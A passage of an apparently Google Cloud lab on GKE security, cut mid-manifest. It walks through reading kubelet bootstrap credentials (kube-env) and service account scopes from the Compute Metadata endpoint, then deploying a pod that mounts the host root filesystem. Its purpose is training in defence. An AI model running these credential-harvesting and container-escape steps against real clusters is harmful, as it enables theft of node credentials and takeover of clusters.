class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl version</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The </span><code>gcloud container clusters create</code><span> command automatically authenticated </span><code>kubectl</code><span> for you.</span></p><ol start='' ><li><p><span>View your running nodes in the Cloud Console. On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM Instances</span></strong><span>.</span></p></li></ol><p><span>Your Kubernetes cluster is now ready for use.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a simple GKE cluster</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-run-a-google-cloud-sdk-pod'><span>Task 2. Run a Google Cloud-SDK pod</span></h2><ol start='' ><li><p><span>From your Cloud Shell prompt, launch a single instance of the Google Cloud-SDK container:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never -- bash</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This will take a few minutes to complete.</span></p><p><strong><span>Note:</span></strong><span> If you get a timed out error, run the command again.</span></p><ol start='' ><li><p><span>You should now have a bash shell inside the pod&#39;s container:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@gcloud:/#</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>It may take a few seconds for the container to be started and the command prompt to be displayed. If you don&#39;t see a command prompt, try pressing </span><strong><span>Enter</span></strong><span>.</span></p><h3 id='explore-the-compute-metadata-endpoint'><span>Explore the Compute Metadata endpoint</span></h3><ol start='' ><li><p><span>Run the following command to access the </span><code>v1</code><span> Compute Metadata endpoint:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s http://metadata.google.internal/computeMetadata/v1/instance/name</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output looks like:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...snip...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your client does not have permission to get URL &lt;code&gt;/computeMetadata/v1/instance/name&lt;/code&gt; from this server. Missing Metadata-Flavor:Google header.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...snip...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Notice how it returns an error stating that it requires the custom HTTP header to be present.</span></p><ol start='' ><li><p><span>Add the custom header on the next run and retrieve the Compute Engine instance name that is running this pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output looks like:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gke-simplecluster-default-pool-b57a043a-6z5v</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> If a custom HTTP header is not required to access a Compute Engine Instance Metadata endpoint, an attacker would need only an application flaw to trick a web URL to provide user credentials. By requiring a custom HTTP header, an attack is more difficult as the attacker would need both an application flaw and the custom header to be successful.</span></p><p><span>Keep this shell inside the pod available for the next step.</span></p><ol start='' ><li><p><span>If you accidentally exit from the pod, simply re-run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never -- bash</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='explore-the-gke-node-bootstrapping-credentials'><span>Explore the GKE node bootstrapping credentials</span></h3><ol start='' ><li><p><span>From inside the same pod shell, run the following command to list the attributes associated with the underlying Compute Engine instances. Be sure to include the trailing slash:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Perhaps the most sensitive data in this listing is </span><code>kube-env</code><span>. It contains several variables which the </span><code>kubelet</code><span> uses as initial credentials when attaching the node to the GKE cluster. The variables </span><code>CA_CERT</code><span>, </span><code>KUBELET_CERT</code><span>, and </span><code>KUBELET_KEY</code><span> contain this information and are therefore considered sensitive to non-cluster administrators.</span></p><ol start='' ><li><p><span>To see the potentially sensitive variables and data, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Therefore, in any of the following situations:</span></p><ul><li><p><span>A flaw that allows for SSRF in a pod application</span></p></li><li><p><span>An application or library flaw that allow for RCE in a pod</span></p></li><li><p><span>An internal user with the ability to create or exec into a pod</span></p></li></ul><p><span>There exists a high likelihood for compromise and exfiltration of sensitive </span><code>kubelet</code><span> bootstrapping credentials via the Compute Metadata endpoint. With the </span><code>kubelet</code><span> credentials, it is possible to leverage them in certain circumstances to escalate privileges to that of </span><code>cluster-admin</code><span> and therefore have full control of the GKE Cluster including all data, applications, and access to the underlying nodes.</span></p><h3 id='leverage-the-permissions-assigned-to-this-node-pools-service-account'><span>Leverage the Permissions assigned to this Node Pool&#39;s service account</span></h3><p><span>By default, Google Cloud projects with the Compute API enabled have a default service account in the format of </span><code>NNNNNNNNNN-compute@developer.gserviceaccount.com</code><span> in the project and the </span><code>Editor</code><span> role attached to it. Also by default, GKE clusters created without specifying a service account will utilize the default Compute service account and attach it to all worker nodes.</span></p><ol start='' ><li><p><span>Run the following </span><code>curl</code><span> command to list the OAuth scopes associated with the service account attached to the underlying Compute Engine instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> https://www.googleapis.com/auth/devstorage.read_only https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/monitoring https://www.googleapis.com/auth/service.management.readonly https://www.googleapis.com/auth/servicecontrol https://www.googleapis.com/auth/trace.append </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><p><span>The combination of authentication scopes and the permissions of the service account dictates what applications on this node can access. The above list is the minimum scopes needed for most GKE clusters, but some use cases require increased scopes.</span></p><p><strong><span>Warning:</span></strong><span> If, during cluster creation, you configured the authentication scope to include </span><code>https://www.googleapis.com/auth/cloud-platform</code><span>, any Google Cloud API would be in scope and only IAM permissions assigned to the service account would determine access.</span></p><p><span>Further, if the default service account with the default IAM Role of </span><code>Editor</code><span> is in use, any pod on this node pool has </span><code>Editor</code><span> permissions to the Google Cloud project where the GKE cluster is deployed. As the </span><code>Editor</code><span> IAM Role has a wide range of read/write permissions to interact with project resources such as Compute instances, Cloud Storage buckets, GCR registries, and more, this is a significant security risk.</span></p><ol start='' ><li><p><span>Exit out of this pod by typing:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> If did not return to cloud shell press ctrl+c</span></p><h2 id='task-3-deploy-a-pod-that-mounts-the-host-filesystem'><span>Task 3. Deploy a pod that mounts the host filesystem</span></h2><p><span>One of the simplest paths for &quot;escaping&quot; to the underlying host is by mounting the host&#39;s filesystem into the pod&#39;s filesystem using standard Kubernetes </span><code>volumes</code><span> and </span><code>volumeMounts</code><span> in a </span><code>Pod</code><span> specification.</span></p><ol start='' ><li><p><span>To demonstrate this, run the following to create a Pod that mounts the underlying host filesystem </span><code>/</code><span> at the folder named </span><code>/rootfs</code><span> inside the container:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt;EOF | kubectl apply -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: hostpath</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: hostpath</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: google/cloud-sdk:latest</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  command: ["/bin/bash"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  args: ["-c", "tail -f /dev/null"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  volumeMounts:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - mountPath: /rootfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  name: rootfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  volumes:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: rootfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  hostPath:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  path: 